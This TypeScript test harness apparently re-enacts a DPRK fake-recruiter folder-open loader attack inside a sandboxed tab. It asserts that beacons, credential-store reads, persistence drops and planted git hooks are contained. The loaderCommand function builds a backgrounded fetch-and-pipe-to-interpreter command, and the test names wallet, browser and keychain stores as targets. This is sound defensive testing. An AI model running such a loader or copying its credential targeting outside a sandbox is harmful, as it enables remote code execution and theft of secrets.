// Contagious-Interview scenario (DPRK fake-recruiter repo, tasks.json folder-open loader):
// the worked example in the threat-model ADR. Opens the inert fixture as its own tab,
// runs the loader exactly as the hidden folder-open task would, and asserts each TTP is
// stopped by the control the ADR names.
//
// The loader is never written to a host file: Microsoft Defender quarantines a faithful
// tasks.json (Trojan:Script/MalTask.A). It is assembled here, in memory, from
// .seclab/loader.parts.json and executed inside the tab (EDR fixture-safety, addendum).

import { spawnSync } from 'node:child_process';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import type { Check } from './assert.ts';

const FIXTURE = path.join(import.meta.dirname, 'fixtures', 'contagious-interview');
const V = 'contagious';
const GATE_GAP = 'write-back gate (docs/edr/20261104-write-back-gate-spike.md; ADR pending)';
const ATTRIBUTION_GAP = 'tab-broker integration (M2/M3) and tab observability: per-task attribution of denials';

export interface Campaign { ws: string; canaries: Record<string, string>; arm: string }

/** Copy the fixture into the run, arm it, seed the credential-store canaries (run dir only). */
export function setupCampaign(work: string, arm: string, loopback: number, marker: string): Campaign {
	const ws = path.join(work, 'tabs', 'ws-campaign');
	fs.cpSync(FIXTURE, ws, { recursive: true });
	// A real repo: the stage plants a git hook, which only matters if .git exists.
	spawnSync('git', ['-C', ws, '-c', 'core.hooksPath=/dev/null', 'init', '-q'], { stdio: 'ignore' });
	const dir = path.join(work, 'canary', 'campaign');
	fs.mkdirSync(dir, { recursive: true });
	const canaries: Record<string, string> = {};
	for (const k of ['wallet', 'browser', 'solana', 'keychain']) {
		canaries[k] = path.join(dir, `${k}.canary`);
		fs.writeFileSync(canaries[k], `seclabcanary_${k}_not_a_secret\n`);
	}
	fs.mkdirSync(path.join(ws, '.seclab'), { recursive: true });
	fs.writeFileSync(path.join(ws, '.seclab', 'targets'), [
		`arm=${arm}`, `run=${work}`, `until=${Math.floor(Date.now() / 1000) + 1800}`, `loopback=${loopback}`, `marker=${marker}`, 'beacons=3',
		...Object.entries(canaries).map(([k, v]) => `${k}=${v}`), '',
	].join('\n'));
	return { ws, canaries, arm };
}

/** After the claim: the stage only counts itself inside a tab whose hostname matches this id. */
export function armCampaignTab(c: Campaign, tabId: string): void {
	fs.appendFileSync(path.join(c.ws, '.seclab', 'targets'), `tab=${tabId}\n`);
}

/** The loader command, assembled in memory only (never a host file). */
export function loaderCommand(ws: string): string {
	const p = JSON.parse(fs.readFileSync(path.join(ws, '.seclab', 'loader.parts.json'), 'utf8')) as
		{ fetchTool: string[]; stageUrl: string; interpreter: string[]; dictStage: string; rehNode: string };
	const fetch = p.fetchTool.join('');
	const interp = p.interpreter.join('');
	return `nohup sh -c '${fetch} ${p.stageUrl} | ${interp}; N=$(command -v ${interp} || echo ${p.rehNode}); $N ${p.dictStage}' >/dev/null 2>&1 &`;
}

interface Ev {
	in_tab: boolean; pid: number; hostname: string; macs: string[]; ipify: Record<string, { status?: number; error?: string }>;
	beacons: Array<Record<string, { status?: number; error?: string } | number>>; tasking_received: boolean;
	canaries: Record<string, string>; drops: string[]; planted: string[]; marker_written: boolean;
}

const denied = (r: unknown) => {
	const x = r as { status?: number; error?: string } | undefined;
	return !!x && (x.error !== undefined || (x.status !== undefined && x.status !== 200));
};

export interface CampaignTab {
	exec(argv: string[]): { status: number | null; stdout: string };
	stop(): Promise<void>;
	start(): Promise<void>;
	/** tab.reset + start: rebuild from the template. */
	reset(): Promise<void>;
	expectHostname: string;
}

/** Run the loader in the tab and assert every TTP is stopped. */
export async function runCampaign(c: Campaign, tab: CampaignTab, marker: string): Promise<Check[]> {
	const checks: Check[] = [];
	const add = (name: string, ok: boolean, detail = '', knownGap?: string) => checks.push({ vector: V, name, ok, detail, knownGap });
	const evFile = path.join(c.ws, '.seclab-evidence', 'contagious.json');
	const hostHooks = path.join(c.ws, '.git', 'hooks', 'pre-commit');
	const hostEnvrc = path.join(c.ws, '.envrc');

	tab.exec(['sh', '-c', loaderCommand(c.ws)]);
	let ev: Ev | undefined;
	for (let i = 0; i < 60; i++) {
		try {
			ev = JSON.parse(fs.readFileSync(evFile, 'utf8')) as Ev;
			if (ev.beacons.length >= 2) {
				break;
			}
		} catch { /* not yet */ }
		await new Promise(r => setTimeout(r, 1000));
	}
	if (!ev) {
		add('stage ran and recorded evidence', false, 'no evidence file');
		return checks;
	}
	const hostMacs = new Set(Object.values(os.networkInterfaces()).flat().map(n => n?.mac).filter(Boolean));

	// T1: the folder-open task runs, but only inside the tab.
	add('loader and stage ran inside the tab, not on the host', ev.in_tab && ev.hostname !== os.hostname() && ev.hostname === tab.expectHostname,
		`in_tab=${ev.in_tab} hostname=${ev.hostname}`);
	// T2: fingerprinting sees the VM/container, not the host.
	add('fingerprint returns tab values (hostname, MACs), not the host\'s', ev.hostname !== os.hostname() && !ev.macs.some(m => hostMacs.has(m)),
		`macs=${ev.macs.join(',')}`);
	// T3: public-IP lookup (ipify stand-in) and C2 beacons (raw IP, vercel stand-in on loopback) denied.
	add('IP-echo lookup denied (direct and via proxy)', denied(ev.ipify.direct) && denied(ev.ipify.via_proxy), JSON.stringify(ev.ipify));
	const all = ev.beacons.flatMap(b => Object.entries(b).filter(([k]) => k !== 't').map(([, v]) => v));
	add(`every C2 beacon denied (${ev.beacons.length} rounds: raw IP and loopback, direct and via proxy)`, all.length > 0 && all.every(denied), JSON.stringify(ev.beacons.at(-1)));
	add('no tasking ever reached the stage (nothing to eval)', !ev.tasking_received);
	add('denials are attributed to the folder-open task', false, 'not observable yet', ATTRIBUTION_GAP);
	// T4: credential stores (wallet, browser profile, solana id.json, keychain) unreadable.
	add('host credential-store canaries unreadable from the tab', Object.keys(c.canaries).every(k => ev!.canaries[k] === 'denied'), JSON.stringify(ev.canaries));
	// T5: persistence drops land only in the tab's own home.
	const hostDrops = [path.join(os.homedir(), '.vscode', 'seclab-ci-drop.js'), path.join(os.homedir(), '.n2', 'seclab-ci-drop')];
	add('persistence drops (~/.vscode, ~/.n2) exist only in the tab\'s home', ev.drops.length === 2
		&& ev.drops.every(d => d.startsWith('/home/') && !d.startsWith(os.homedir() + path.sep))
		&& !hostDrops.some(d => fs.existsSync(d))
		&& tab.exec(['sh', '-c', 'test -f "$HOME/.vscode/seclab-ci-drop.js" && test -f "$HOME/.n2/seclab-ci-drop"']).status === 0,
	ev.drops.join(', '));
	add('no containment-failure marker', !ev.marker_written && !fs.existsSync(marker));
	// T6: the backdoor keeps running in the background, but dies with the tab.
	const pid = String(ev.pid);
	const alive = () => tab.exec(['sh', '-c', `kill -0 ${pid} 2>/dev/null && tr '\\0' ' ' < /proc/${pid}/cmdline | grep -q spellright`]).status === 0;
	const wasAlive = alive();
	await tab.stop();
	await tab.start();
	add('the background stage runs in the tab and dies when the tab stops', wasAlive && !alive(), `alive before stop=${wasAlive}`);
	// Persistent tabs keep their home, so the drops survive a stop; "Reset tab" rebuilds the
	// tab from the template and discards them.
	const dropsThere = () => tab.exec(['sh', '-c', 'test -e "$HOME/.vscode/seclab-ci-drop.js" || test -e "$HOME/.n2/seclab-ci-drop"']).status === 0;
	const survivedStop = dropsThere();
	await tab.reset();
	add('Reset tab discards the persistence drops from the tab\'s home', survivedStop && !dropsThere(), `present after stop=${survivedStop}`);
	// T7: host-executed code planted in the workspace never goes live in the host checkout.
	const planted = (p: string) => {
		try {
			return fs.readFileSync(p, 'utf8').includes(`seclab-ci planted ${c.arm}`);
		} catch {
			return false;
		}
	};
	add('planted .git/hooks/pre-commit never live in the host checkout', !planted(hostHooks), ev.planted.join(', '), GATE_GAP);
	add('planted .envrc never live in the host checkout', !planted(hostEnvrc), '', GATE_GAP);
	return checks;
}

/** Remove the planted files from the host checkout (inert, but still not left behind). */
export function disarmCampaign(c: Campaign): void {
	for (const p of [path.join(c.ws, '.git'), path.join(c.ws, '.envrc')]) {
		fs.rmSync(p, { recursive: true, force: true });
	}
}
